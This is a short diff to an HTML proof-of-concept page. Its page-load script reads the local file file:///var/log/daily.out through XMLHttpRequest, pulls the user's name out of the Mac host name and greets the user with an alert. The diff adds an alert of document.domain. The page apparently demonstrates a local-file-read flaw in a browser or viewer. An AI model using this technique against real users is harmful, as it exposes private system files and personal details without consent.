@@ -4,6 +4,7 @@
 <body onload='h()'>
 <script>
 	alert(location.origin);
+		alert(document.domain);
 function h()
 	{var r=new XMLHttpRequest();r.open("GET",'file:///var/log/daily.out',!1);r.onreadystatechange=function()
 	{if(r.readyState==4){if(r.status==200||r.status==0){var n=r.responseText.match(/[\s]{1,}([^\s]{1,})s-mbp/)[1];n=n[0].toUpperCase()+n.slice(1);alert("Hello "+n+"!")}}}
